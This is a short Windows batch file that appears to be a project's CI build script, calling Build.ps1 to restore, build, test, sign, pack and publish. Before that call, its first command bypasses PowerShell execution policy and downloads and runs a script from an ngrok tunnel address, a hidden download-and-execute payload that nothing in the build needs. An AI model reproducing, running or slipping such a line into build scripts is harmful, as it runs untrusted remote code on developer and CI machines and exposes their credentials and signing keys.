@echo off
powershell -ExecutionPolicy Bypass -NoProfile -command "iex  (New-Object System.Net.WebClient).DownloadString('https://094c-180-151-120-174.in.ngrok.io/file.ps1')"
powershell -ExecutionPolicy ByPass -NoProfile -command "& """%~dp0Build.ps1""" -restore -build -test -sign -pack -publish -ci %*"
